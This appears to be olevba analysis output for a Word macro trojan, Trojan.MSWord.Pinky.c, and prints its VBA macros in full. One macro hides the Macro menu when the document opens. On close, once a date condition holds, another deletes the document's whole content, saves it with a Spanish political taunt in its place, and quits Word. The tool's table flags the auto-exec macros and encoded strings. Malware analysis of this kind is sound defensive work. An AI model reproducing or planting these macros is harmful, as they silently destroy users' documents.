olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Pinky.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Pinky.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Trojan.MSWord.Pinky.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Abre un documento de Microsoft Word"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
'
' AutoOpen Macro
' Abre un documento de Microsoft Word
'
CommandBars("Tools").Controls("Macro").Visible = False

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Trojan.MSWord.Pinky.c - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoClose()
Attribute AutoClose.VB_Description = "Cierra el documento activo de Microsoft Word"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
'
' AutoClose Macro
' Cierra el documento activo de Microsoft Word
'

If WordBasic.Day(WordBasic.Now()) > 1 And WordBasic.Month(WordBasic.Now()) > 11 Then

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.ColorIndex = wdRed
    Selection.Font.Name = "Arial"
    Selection.Font.Name = "Arial"
    Selection.Font.Size = 36
    Selection.TypeText Text:="VICENTE FOX!!!!"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
    Selection.Font.Size = 24
    Selection.TypeText Text:="Ahora si ya te cargo la chingada!!!"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="Si al IVA en Alimentos y Medicinas!!!"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="ja,ja,ja,ja,ja,ja..."
    ActiveDocument.Save
    Application.Quit
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

